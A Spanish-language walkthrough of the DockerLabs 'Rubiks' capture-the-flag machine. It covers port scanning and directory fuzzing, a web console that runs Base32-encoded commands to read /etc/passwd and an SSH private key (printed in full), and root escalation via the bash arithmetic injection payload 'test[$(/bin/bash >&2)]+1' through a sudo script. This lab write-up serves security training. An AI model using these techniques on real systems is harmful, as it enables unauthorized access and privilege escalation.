---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Rubiks DockerLabs (Intermediate)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip rubiks.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh rubiks.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-07 16:19 CET
Nmap scan report for 172.17.0.2
Host is up (0.000023s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 7e:3f:77:f8:5e:4e:89:42:4a:ce:14:3b:ac:59:05:74 (ECDSA)
|_  256 b4:2a:b2:f8:4a:1b:50:09:fb:17:28:b7:29:e6:9e:6d (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://rubikcube.dl/
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.10 seconds
```

Si entramos en el puerto `80` veremos que esta bajo un dominio llamado `rubikcube.dl`, por lo que vamos añadirlo a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>           rubikcube.dl
```

Lo guardamos y entraremos bajo ese dominio.

```
URL = http://rubikcube.dl/
```

Veremos una pagina normal de forma aparente, por lo que vamos a realizar un poco de `fuzzing`.

## Gobuster

```shell
gobuster dir -u http://rubikcube.dl/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://rubikcube.dl/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/about.php            (Status: 200) [Size: 4181]
/administration       (Status: 200) [Size: 5460]
/faq.php              (Status: 200) [Size: 7817]
/img                  (Status: 200) [Size: 3545]
/index.php            (Status: 200) [Size: 4327]
/server-status        (Status: 403) [Size: 277]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos varias rutas interesantes, entre ellas el llamado `/administration`, vamos a ver que contiene ese directorio.

Vemos que es un panel de administrador normal, pero si nos vamos a `configuration.php` veremos la configuracion de algo del panel, pero tendremos otro panel lateral izquierdo:

```
URL = http://rubikcube.dl/administration/configuration.php
```

En dicho panel, veremos una opcion llamada `Console` que si pinchamos nos llevara al archivo llamado `myconsole.php` pero nos dara un error:

```
URL = http://rubikcube.dl/myconsole.php
```

Vemos que nos esta eliminando la parte de `administration`, pero si se lo añadimos veremos que funciona:

```
URL = http://rubikcube.dl/administration/myconsole.php
```

Veremos como una consola que nos indica que podremos ejecutar comandos, pero de forma codificada, por lo que vamos a probar a codificarlo en `Base32` y realizando el siguiente comando:

```shell
cat /etc/passwd
```

> Codificado

```
MNQXIIBPMV2GGL3QMFZXG53E
```

Info:

```

Salida del Comando:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
luisillo:x:1001:1001::/home/luisillo:/bin/sh
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
```

Vemos que funciona perfectamente, pero si hacemos un simple `ls -la` veremos lo siguiente:

```
Salida del Comando:

total 40
drwxr-xr-x 1 root root 4096 Aug 30  2024 .
drwxr-xr-x 1 root root 4096 Aug 30  2024 ..
-rwxr-xr-x 1 root root 3389 Aug 30  2024 .id_rsa
-rw-r--r-- 1 root root 6665 Aug 30  2024 configuration.php
drwxr-xr-x 2 root root 4096 Aug 30  2024 img
-rw-r--r-- 1 root root 5460 Aug 30  2024 index.php
-rw-r--r-- 1 root root 3509 Aug 30  2024 myconsole.php
-rw-r--r-- 1 root root 1825 Aug 30  2024 styles.css
```

Vemos que hay un `id_rsa` que puede ser del usuario `luisillo` por lo que haremos lo siguiente:

```shell
cat .id_rsa
```

> Codificada

```
MNQXIIBONFSF64TTME======
```

Info:

```
Salida del Comando:

-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Vemos que hemos obtenido la clave privada del usuario `luisillo`, por lo que haremos lo siguiente:

> id\_rsa

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

```shell
chmod 600 id_rsa
```

### SSH

```shell
ssh -i id_rsa luisillo@<IP>
```

Info:

```
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:YIkHKXH1exQCs/omWp6MtzBankdZUl1a61b/33eg5Ww.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.11.2-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Fri Aug 30 03:00:21 2024 from 172.17.0.1
$ whoami
luisillo
```

Cuando ejecutemos eso, estaremos dentro como dicho usuario sin necesidad de introducir una contraseña.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for luisillo on c7977b0f421c:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User luisillo may run the following commands on c7977b0f421c:
    (ALL) NOPASSWD: /bin/cube
```

Vemos que podemos ejecutar el binario `cube` como el usuario `root`, por lo que haremos lo siguiente:

Si leemos el binario que se podra leer de forma facil:

```shell
cat /usr/bin/cube
```

Info:

```bash
#!/bin/bash

# Inicio del script de verificación de número
echo -n "Checker de Seguridad "

# Solicitar al usuario que ingrese un número
echo "Por favor, introduzca un número para verificar:"

# Leer la entrada del usuario y almacenar en una variable
read -rp "Digite el número: " num

# Función para comprobar el número ingresado
echo -e "\n"
check_number() {
  local number=$1
  local correct_number=666

  # Verificación del número ingresado
  if [[ $number -eq $correct_number ]]; then
    echo -e "\n[+] Correcto"
  else
    echo -e "\n[!] Incorrecto"
  fi
}

# Llamada a la función para verificar el número
check_number "$num"

# Mensaje de fin de script
echo -e "\n La verificación ha sido completada."
```

Vemos que tiene una vulnerabilidad para injectar comandos en la entrada del usuario, por lo que haremos lo siguiente:

```shell
test[$(/bin/bash >&2)]+1
```

```shell
sudo cube
Checker de Seguridad Por favor, introduzca un número para verificar:
Digite el número: test[$(/bin/bash >&2)]+1
```

Info:

```
root@c7977b0f421c:/# whoami
root
```

Con esto ya seremos `root`, por lo que habremos terminado la maquina.
